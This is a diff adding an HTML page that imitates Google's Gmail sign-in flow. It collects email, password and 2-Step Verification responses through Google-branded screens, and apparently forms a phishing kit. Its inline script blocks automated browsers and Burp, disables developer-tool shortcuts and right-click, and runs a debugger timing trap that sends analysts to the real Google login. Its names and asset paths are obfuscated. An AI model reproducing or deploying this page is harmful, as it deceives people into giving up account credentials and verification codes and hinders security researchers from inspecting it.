@@ -1,0 +1,1638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/list.js/2.3.1/list.min.js"></script>
+    <link rel="preload" href="/GDSherpa-bold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="/GDSherpa-bold.woff" as="font" type="font/woff" crossorigin="anonymous">
+    <link rel="preload" href="/GDSherpa-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="/GDSherpa-regular.woff" as="font" type="font/woff" crossorigin="anonymous">
+    <link rel="preload" href="/GDSherpa-vf.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="/GDSherpa-vf2.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="stylesheet" href="/yz5CrPGqdGiyVuvaFK78xP8ir0VcC8sqf29SxHFjLOOC9QBywTITAUa6C4xmAJ491m8xF2LFckConQ90BcaTW1iMVGyhrBaEY9QXBjQIBZHSRgfwWcLAazWCVkpd9psm1L7RbCYKkcoqRNiX2DQ6nxewSRij520">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JdReAPBcEw</title>
+    <style>    
+    @font-face {
+        font-family: 'Google Sans';
+        src: url('/GoogleSans-Bold.eot');
+        src: local('Google Sans Bold'), local('GoogleSans-Bold'),
+            url('/GoogleSans-Bold.eot?#iefix') format('embedded-opentype'),
+            url('/GoogleSans-Bold.woff2') format('woff2'),
+            url('/GoogleSans-Bold.woff') format('woff'),
+            url('/GoogleSans-Bold.ttf') format('truetype');
+        font-weight: bold;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Google Sans';
+        src: url('/GoogleSans-Medium.eot');
+        src: local('Google Sans Medium'), local('GoogleSans-Medium'),
+            url('/GoogleSans-Medium.eot?#iefix') format('embedded-opentype'),
+            url('/GoogleSans-Medium.woff2') format('woff2'),
+            url('/GoogleSans-Medium.woff') format('woff'),
+            url('/GoogleSans-Medium.ttf') format('truetype');
+        font-weight: 500;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Google Sans';
+        src: url('/GoogleSans-Regular.eot');
+        src: local('Google Sans Regular'), local('GoogleSans-Regular'),
+            url('/GoogleSans-Regular.eot?#iefix') format('embedded-opentype'),
+            url('/GoogleSans-Regular.woff2') format('woff2'),
+            url('/GoogleSans-Regular.woff') format('woff'),
+            url('/GoogleSans-Regular.ttf') format('truetype');
+        font-weight: normal;
+        font-style: normal;
+    }
+    
+    /* */
+    @font-face {
+        font-family: 'Product Sans';
+        src: local('Product Sans Bold'), local('ProductSans-Bold'),
+            url('/ProductSans-Bold.ttf') format('truetype');
+        font-weight: bold;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Product Sans';
+        src: local('Product Sans'), local('ProductSans-Regular'),
+            url('/ProductSans-Regular.ttf') format('truetype');
+        font-weight: normal;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Product Sans';
+        src: local('Product Sans Black'), local('ProductSans-Black'),
+            url('/ProductSans-Black.ttf') format('truetype');
+        font-weight: 900;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Product Sans';
+        src: local('Product Sans Thin'), local('ProductSans-Thin'),
+            url('/ProductSans-Thin.ttf') format('truetype');
+        font-weight: 100;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Product Sans';
+        src: local('Product Sans Light'), local('ProductSans-Light'),
+            url('/ProductSans-Light.ttf') format('truetype');
+        font-weight: 300;
+        font-style: normal;
+    }
+
+    @font-face {
+        font-family: 'Product Sans';
+        src: local('Product Sans Medium'), local('ProductSans-Medium'),
+            url('/ProductSans-Medium.ttf') format('truetype');
+        font-weight: 500;
+        font-style: normal;
+    }
+    /* */
+
+    @font-face {
+        font-family: 'Roboto';
+        src: url('/Roboto-Bold.eot');
+        src: local('Roboto Bold'), local('Roboto-Bold'),
+            url('/Roboto-Bold.eot?#iefix') format('embedded-opentype'),
+            url('/Roboto-Bold.woff2') format('woff2'),
+            url('/Roboto-Bold.woff') format('woff'),
+            url('/Roboto-Bold.ttf') format('truetype');
+        font-weight: bold;
+        font-style: normal;
+    }
+    
+    
+    @font-face {
+        font-family: 'Roboto';
+        src: url('/Roboto-Regular.eot');
+        src: local('Roboto'), local('Roboto-Regular'),
+            url('/Roboto-Regular.eot?#iefix') format('embedded-opentype'),
+            url('/Roboto-Regular.woff2') format('woff2'),
+            url('/Roboto-Regular.woff') format('woff'),
+            url('/Roboto-Regular.ttf') format('truetype');
+        font-weight: normal;
+        font-style: normal;
+    }
+    
+    
+    @font-face {
+        font-family: 'Roboto';
+        src: url('/Roboto-Black.eot');
+        src: local('Roboto Black'), local('Roboto-Black'),
+            url('/Roboto-Black.eot?#iefix') format('embedded-opentype'),
+            url('/Roboto-Black.woff2') format('woff2'),
+            url('/Roboto-Black.woff') format('woff'),
+            url('/Roboto-Black.ttf') format('truetype');
+        font-weight: 900;
+        font-style: normal;
+    }
+
+    @font-face {
+        font-family: 'Roboto';
+        src: url('/Roboto-Thin.eot');
+        src: local('Roboto Thin'), local('Roboto-Thin'),
+            url('/Roboto-Thin.eot?#iefix') format('embedded-opentype'),
+            url('/Roboto-Thin.woff2') format('woff2'),
+            url('/Roboto-Thin.woff') format('woff'),
+            url('/Roboto-Thin.ttf') format('truetype');
+        font-weight: 100;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Roboto';
+        src: url('/Roboto-Light.eot');
+        src: local('Roboto Light'), local('Roboto-Light'),
+            url('/Roboto-Light.eot?#iefix') format('embedded-opentype'),
+            url('/Roboto-Light.woff2') format('woff2'),
+            url('/Roboto-Light.woff') format('woff'),
+            url('/Roboto-Light.ttf') format('truetype');
+        font-weight: 300;
+        font-style: normal;
+    }
+    
+    @font-face {
+        font-family: 'Roboto';
+        src: url('/Roboto-Italic.eot');
+        src: local('Roboto Italic'), local('Roboto-Italic'),
+            url('/Roboto-Italic.eot?#iefix') format('embedded-opentype'),
+            url('/Roboto-Italic.woff2') format('woff2'),
+            url('/Roboto-Italic.woff') format('woff'),
+            url('/Roboto-Italic.ttf') format('truetype');
+        font-weight: normal;
+        font-style: italic;
+    }
+    
+    @font-face {
+        font-family: 'Roboto';
+        src: url('/Roboto-Medium.eot');
+        src: local('Roboto Medium'), local('Roboto-Medium'),
+            url('/Roboto-Medium.eot?#iefix') format('embedded-opentype'),
+            url('/Roboto-Medium.woff2') format('woff2'),
+            url('/Roboto-Medium.woff') format('woff'),
+            url('/Roboto-Medium.ttf') format('truetype');
+        font-weight: 500;
+        font-style: normal;
+    }
+    
+
+    </style>
+    <script>
+    if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.includes("Burp")) {
+        window.location = "about:blank";
+}
+document.addEventListener("keydown", function (event) {
+    function LtsEzWjKxN(event) {
+        const TWfvzYaVTu = [
+            { keyCode: 123 },
+            { ctrl: true, keyCode: 85 },
+            { ctrl: true, shift: true, keyCode: 73 },
+            { ctrl: true, shift: true, keyCode: 67 },
+            { ctrl: true, shift: true, keyCode: 74 },
+            { ctrl: true, shift: true, keyCode: 75 },
+            { ctrl: true, keyCode: 72 }, // Ctrl + H
+            { meta: true, alt: true, keyCode: 73 },
+            { meta: true, alt: true, keyCode: 67 },
+            { meta: true, keyCode: 85 }
+        ];
+
+        return TWfvzYaVTu.some(ddbWLKNPBC =>
+            (!ddbWLKNPBC.ctrl || event.ctrlKey) &&
+            (!ddbWLKNPBC.shift || event.shiftKey) &&
+            (!ddbWLKNPBC.meta || event.metaKey) &&
+            (!ddbWLKNPBC.alt || event.altKey) &&
+            event.keyCode === ddbWLKNPBC.keyCode
+        );
+    }
+
+    if (LtsEzWjKxN(event)) {
+        event.preventDefault();
+        return false;
+    }
+});
+document.addEventListener('contextmenu', function(event) {
+    event.preventDefault();
+    return false;
+});
+VZxkdRgJZD = false;
+(function rgeLvmYREd() {
+    let hTevfJhRkh = false;
+    const GiAuLwtkrp = 100;
+    setInterval(function() {
+        const QysIjqeXKr = performance.now();
+        debugger;
+        const rffVEZMWRP = performance.now();
+        if (rffVEZMWRP - QysIjqeXKr > GiAuLwtkrp && !hTevfJhRkh) {
+            VZxkdRgJZD = true;
+            hTevfJhRkh = true;
+            window.location.replace('https://accounts.google.com/');
+        }
+    }, 100);
+})();
+    document.addEventListener('copy', function(event) {
+    if (document.activeElement.tagName === 'INPUT' || 
+        document.activeElement.tagName === 'TEXTAREA' || 
+        document.activeElement.isContentEditable) {
+        return;
+    }
+    event.preventDefault();
+    var customWord = "xNaaQKKUeY";
+    event.clipboardData.setData('text/plain', customWord);
+    });
+    </script>
+</head>
+
+<body class="start">
+<div class="main-ele">
+<div class="main">
+<div class="progress-bar-outerele">
+<div class="progress-bar-innerele">
+<div class="progress-bar-ele">
+<div class="progress-bar-background"></div>
+<div class="progress-bar-loading-primary-ele">
+<div class="progress-bar-loading-primary"></div>
+</div>
+<div class="progress-bar-loading-ele">
+<div class="progress-bar-loading"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="main-innerele">
+<div class="container">
+<div id="container-white-overlay"></div>
+  <div class="top-content">
+    <div class="Wf6lSd" jscontroller="rmumx" jsname="n7vHCb"><svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg></div>
+
+    <div class="section-top section-top-visible" id="section_uname_top">
+    <h2 class="heading-top">Sign in</h2>
+    <p class="heading">to continue to Gmail</p>
+    </div>
+    <div class="section-top" id="section_pass_top">
+    <h2 class="heading-top">Welcome</h2>
+    <div class="accountdropdown-ele">
+    <div class="accountdropdown pr-7">
+    <div class="accountdropdownimg-outerele">
+    <div class="accountdropdownimg-ele" aria-hidden="true">
+    <svg aria-hidden="true" class="accountdropdownimg" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+    </svg>
+    </div>
+    </div>
+
+    <div class="accountdropdownemail">email</div>
+    <div class="accountdropdownarrow-ele">
+    <svg aria-hidden="true" class="stUf5b accountdropdownarrow" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+    </svg>
+   </div>
+</div>
+</div>
+
+    </div>
+
+    <div class="section-top" id="section_verifyitsyou_top">
+    <h2 class="heading-top">Verify it's you</h2>
+    <p class="heading-desc">To help keep your account safe, Google wants to make sure it's really you trying to sign in
+    <a class="heading-link" href="https://support.google.com/accounts/answer/7162782" target="_blank">Learn more</a>
+    </p>
+    <div class="accountdropdown-ele">
+    <div class="accountdropdown pr-7">
+    <div class="accountdropdownimg-outerele">
+    <div class="accountdropdownimg-ele" aria-hidden="true">
+    <svg aria-hidden="true" class="accountdropdownimg" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+    </svg>
+    </div>
+    </div>
+
+    <div class="accountdropdownemail">email</div>
+    <div class="accountdropdownarrow-ele">
+    <svg aria-hidden="true" class="stUf5b accountdropdownarrow" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+    </svg>
+   </div>
+</div>
+</div>
+
+    </div>
+
+    <div class="section-top" id="section_2fa_top">
+    <h2 class="heading-top">2-Step Verification</h2>
+    <p class="heading-desc">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
+    <div class="accountdropdown-ele">
+    <div class="accountdropdown pr-7">
+    <div class="accountdropdownimg-outerele">
+    <div class="accountdropdownimg-ele" aria-hidden="true">
+    <svg aria-hidden="true" class="accountdropdownimg" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+    </svg>
+    </div>
+    </div>
+
+    <div class="accountdropdownemail">email</div>
+    <div class="accountdropdownarrow-ele">
+    <svg aria-hidden="true" class="stUf5b accountdropdownarrow" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+    </svg>
+   </div>
+</div>
+</div>
+
+    </div>
+
+    <div class="section-top" id="section_changepassword_top">
+    <h2 class="heading-top">Change password</h2>
+    <div class="accountdropdown-ele">
+    <div class="accountdropdown pr-7">
+    <div class="accountdropdownimg-outerele">
+    <div class="accountdropdownimg-ele" aria-hidden="true">
+    <svg aria-hidden="true" class="accountdropdownimg" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+    </svg>
+    </div>
+    </div>
+
+    <div class="accountdropdownemail">email</div>
+    <div class="accountdropdownarrow-ele">
+    <svg aria-hidden="true" class="stUf5b accountdropdownarrow" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+    </svg>
+   </div>
+</div>
+</div>
+
+    </div>
+
+    <div class="section-top" id="section_sign_in_stopped_top">
+    <h2 class="heading-top">Sign-in stopped</h2>
+    <div class="accountdropdown-ele">
+    <div class="accountdropdown pr-7">
+    <div class="accountdropdownimg-outerele">
+    <div class="accountdropdownimg-ele" aria-hidden="true">
+    <svg aria-hidden="true" class="accountdropdownimg" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+    </svg>
+    </div>
+    </div>
+
+    <div class="accountdropdownemail">email</div>
+    <div class="accountdropdownarrow-ele">
+    <svg aria-hidden="true" class="stUf5b accountdropdownarrow" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+    </svg>
+   </div>
+</div>
+</div>
+
+    </div>
+
+    <div class="section-top" id="section_couldnt_sign_in_top">
+    <h2 class="heading-top">Couldn't sign you in</h2>
+    <div class="accountdropdown-ele">
+    <div class="accountdropdown pr-7">
+    <div class="accountdropdownimg-outerele">
+    <div class="accountdropdownimg-ele" aria-hidden="true">
+    <svg aria-hidden="true" class="accountdropdownimg" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+    </svg>
+    </div>
+    </div>
+
+    <div class="accountdropdownemail">email</div>
+    <div class="accountdropdownarrow-ele">
+    <svg aria-hidden="true" class="stUf5b accountdropdownarrow" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+    </svg>
+   </div>
+</div>
+</div>
+
+    </div>
+
+  </div>
+
+<div id="sections">
+  <div class="section section-visible" id="section_uname">
+  <div class="section-content pd-v-24" id="section_content-uname">
+  <div class="inputs-ele pd-v-8">
+  <div class="inputs">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="text" name="email" id="inp_email" class="input">
+    <label for="email" class="input-label">Email or phone</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_email"></div>
+    </div>
+    </div>
+    <div id="error_email_ele" class="error-ele">
+    <div id="error_email" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_email_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="link-btn-ele pt-9-pb-3">
+  <a href="" class="link-btn link-roboto pt-1h link-blue-transparent">Forgot email?</a>
+  </div>
+  </div>
+  <div class="details-ele pt-9-pb-3 mt-32">
+  <p class="details">Not your computer? Use Guest mode to sign in privately.</p>
+  <a href="" class="link-btn link-roboto link-learnmore detailslink link-blue-transparent">Learn more</a>
+  </div>
+  </div>
+  
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-light-blue-create-acc-btn btn-background-animation-ele mt-6-mb-6">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Create account</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_pass">
+
+  <div class="section-content pd-v-27" id="section_content-pass">
+  <div class="inputs-ele mt-45">
+  <div class="inputs">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="password" name="password" id="inp_password" class="input">
+    <label for="password" class="input-label">Enter your password</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_password"></div>
+    </div>
+    </div>
+    <div id="error_password_ele" class="error-ele">
+    <div id="error_password" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_password_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-8">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele input-checkbox-password">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Show password
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-light-blue-forgot-pass-btn btn-background-animation-ele mt-6-mb-6">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Forgot password?</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_2fa">
+
+  <div class="section-content pd-v-27" id="section_content-2fa">
+  <div class="text-1 optionsselectele-top">
+  <span>
+  Choose how you want to sign in:
+  </span>
+  </div>
+  <div class="mr-pd optionsselectele">
+  <ul class="optionsselect-ul" id="twofamethodslist">
+  <li class="optionsselect-li">
+  <div class="optionsselect-li-div">
+  <div class="optionsselect-li-div-img">
+  <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M23,9 C18.89,4.89 13.07,3.57 7.85,5.02 L17.42,14.59 L23,9 Z M5.76,5.76 L2.81,2.81 L1.39,4.22 L3.91,6.74 C2.88,7.37 1.89,8.11 1,9 L12,20 L14.59,17.41 L19.78,22.6 L21.19,21.19 L16,16 L5.76,5.76 Z"></path></svg>
+  </div>
+  <div class="openseleect-li-div-ele">
+  <div class="optionsselect-li-div-title">
+  Use your phone or tablet to get a security code (even if it's offline)
+  </div>
+  </div>
+  </div>
+  </li>
+  <li class="optionsselect-li">
+  <div class="optionsselect-li-div">
+  <div class="optionsselect-li-div-img">
+  <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"></path></svg>
+  </div>
+  <div class="openseleect-li-div-ele">
+  <div class="optionsselect-li-div-title">
+  Get a call at (â¢â¢â¢) â¢â¢â¢-â¢â¢29
+  </div>
+  <div class="optionsselect-li-div-title-desc">
+  2-Step Verification phone<div class="PrDSKc">Standard rates apply</div>
+  </div>
+  </div>
+
+  </div>
+  </li>
+  </ul>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_mobile_prompt">
+
+  <div class="section-content pd-v-27" id="section_content-mobile_prompt">
+
+  <div class="section_center_animation_ele mt-24" id="mobilepromptyesanimation">
+  <div class="section_center_animation_background"></div>
+  <img src="opk3tI8yIIsPXTfOSUtCrwwR7IeYrQPYMMIcI9zz2jFurHdfwJf5O3hJ2JuZDKXBk0xklTFB3gZO92xlW6DtQ8KNijLxmXZdvYC4oOZVx5BufkMAkRWKcNIK3yYUt6CfTCtlIQUR9vKKcMvgBzteQef535" class="section_center_animation" aria-hidden="true" alt="" data-iml="27886.200000000186">
+  </div>
+
+  <div class="mobile_yes_prompt_code_ele mt-24" id="mobilepromptcode">
+  <div class="mobile_yes_prompt_code" id="mobilepromptcodetext">
+  </div>
+  
+  <div class="mr-pd">
+  <div class="text-1" id="mobile_prompt_mobile_check">
+  Check your <span id="mobile_prompt_mobile_check_mobile_name"></span>
+  </div>
+  <div class="mr-pd" id="mobile_prompt_mobile_desc">
+  Google sent a notification to your <span id="mobile_prompt_mobile_desc_mobile_name"></span>. Tap <strong>Yes</strong> on the notification to verify it's you.
+  </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Don't ask again on this device
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele">
+  <div class="bottom-links-v-ele">
+    <div class="bottom-link-h">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-resend-it-btn" data-id="resend_it" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Resend it</span>
+    </button>
+    </div>
+    <div class="form-bottom-link mt-38">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  </div>
+
+</div>
+
+</div>
+
+</div>
+
+<div class="section" id="section_sign_in_stopped">
+
+  <div class="section-content pd-v-24" id="section_content-sign_in_stopped">
+  <div class="sign-in-stopped-text">
+  <div class="pt-9-pb-3">You told us you aren't trying to sign in on a different device right now.</div>
+  <div class="pt-9-pb-3">If this was a mistake, try signing in again.</div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-try-again-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try again</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+<div class="section" id="section_couldnt_sign_in">
+
+  <div class="section-content pd-v-24" id="section_content-couldnt_sign_in">
+  <div class="sign-in-stopped-text">
+  <div class="pt-9-pb-3">You've tried to sign in too many times. For your protection, you can't sign in right now.</div>
+  <div class="pt-9-pb-3">Try again later or sign in from a different device.</div>
+  <div class="pt-9-pb-3">If you still have trouble, contact your organization's admin. <a class="link-btn link-roboto link-learnmore detailslink link-blue-transparent" href="https://support.google.com/a/answer/10710447?hl=en-US">Your admin may need to take steps</a> to help you regain access.</div>
+  </div>
+  </div>
+
